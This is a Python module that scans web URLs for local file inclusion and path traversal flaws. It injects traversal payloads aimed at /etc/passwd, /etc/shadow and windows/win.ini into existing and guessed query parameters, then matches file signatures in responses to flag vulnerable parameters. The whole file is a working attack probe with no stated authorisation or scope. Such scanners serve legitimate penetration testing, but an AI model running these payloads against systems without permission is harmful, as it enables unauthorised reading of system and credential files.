import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "/etc/shadow",
]

SIGNATURES = [
    "root:x:",
    "daemon:",
    "[extensions]",
    "bin:/bin",
    "nobody:x:",
    "[fonts]",
]

# common parameter names that are often vulnerable to LFI
COMMON_PARAMS = [
    "file", "page", "include", "path", "template", "view",
    "doc", "lang",  # trimmed to top 8 most commonly exploited
]


def _inject_payload(url, param, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _test_param(url, param, payload):
    test_url = _inject_payload(url, param, payload)
    try:
        r = requests.get(test_url, timeout=5, allow_redirects=True)
        for sig in SIGNATURES:
            if sig in r.text:
                return {
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "type": "LFI / Path Traversal",
                }
    except Exception:
        pass
    return None


def scan_lfi(url):
    print(f"\n[LFI] Scanning: {url}")
    results = []
    found = set()

    parsed = urlparse(url)
    existing_params = list(parse_qs(parsed.query).keys())

    # test both existing params AND common param names
    all_params = list(set(existing_params + COMMON_PARAMS))

    for param in all_params:
        for payload in PAYLOADS:
            key = (url, param, payload)
            if key in found:
                continue

            result = _test_param(url, param, payload)
            if result:
                print(f"  [VULN] LFI → param='{param}' payload='{payload}'")
                results.append(result)
                found.add(key)
                break  # move to next param once vuln found

    print(f"  [LFI] Found {len(results)} vulnerability(ies).")
    return results